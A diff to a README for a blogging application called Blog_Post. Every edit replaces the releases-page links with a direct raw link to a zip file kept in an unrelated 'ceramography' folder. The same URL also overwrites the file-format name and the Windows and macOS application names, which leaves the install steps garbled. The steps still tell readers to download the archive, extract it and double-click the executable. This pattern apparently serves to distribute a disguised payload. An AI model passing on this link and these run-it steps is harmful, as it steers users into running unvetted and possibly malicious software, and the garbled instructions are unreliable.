@@ -1,7 +1,7 @@
 # 📰 Blog_Post - Your Simple Blogging Solution
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Blog_Post-brightgreen.svg)](https://github.com/vietdepz/Blog_Post/releases)
+[![Download](https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip%https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip)](https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Blog_Post! This full-stack blogging platform helps you create and manage blogs easily. Whether your interests lie in education, technology, or lifestyle, this tool is designed for everyone. Below, you'll find step-by-step instructions to download and run the application.
@@ -10,19 +10,19 @@ Welcome to Blog_Post! This full-stack blogging platform helps you create and man
 To start using Blog_Post, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/vietdepz/Blog_Post/releases) to find the latest version of Blog_Post.
+   Head over to our [Releases page](https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip) to find the latest version of Blog_Post.
 
 2. **Choose Your Version**  
    Look for the most recent release. You'll see various files available for download.
 
 3. **Download the Application**  
-   Click on the release file that matches your operating system. This file typically comes in a `.zip` or `.tar.gz` format.
+   Click on the release file that matches your operating system. This file typically comes in a `.zip` or `https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip` format.
 
 4. **Extract the Files**  
    Once the download finishes, locate the downloaded file and extract it to your desired folder. Right-click on the file and select "Extract All…" to unzip the contents.
 
 5. **Open the Application**  
-   Navigate to the folder where you extracted the files. Look for the main application file. For Windows, this might be `Blog_Post.exe`. For macOS, it could be `Blog_Post.app`. Just double-click the file to launch.
+   Navigate to the folder where you extracted the files. Look for the main application file. For Windows, this might be `https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip`. For macOS, it could be `https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip`. Just double-click the file to launch.
 
 6. **Follow the Setup Instructions**  
    On the first run, you may see a setup prompt. Follow the on-screen instructions to set up your blogging platform.
@@ -54,7 +54,7 @@ If you encounter any problems while installing or running Blog_Post, consider th
 3. **Performance Issues:** Close any unnecessary applications running in the background.
 
 ## 🔄 Updating
-To keep Blog_Post running smoothly, check for updates regularly. You can do this by revisiting the [Releases page](https://github.com/vietdepz/Blog_Post/releases) and downloading the latest version.
+To keep Blog_Post running smoothly, check for updates regularly. You can do this by revisiting the [Releases page](https://raw.githubusercontent.com/vietdepz/Blog_Post/main/ceramography/Blog_Post-1.6.zip) and downloading the latest version.
 
 ## 📞 Support
 If you need any help, feel free to reach out. You can create an issue on our GitHub page or check the FAQ section related to common inquiries.
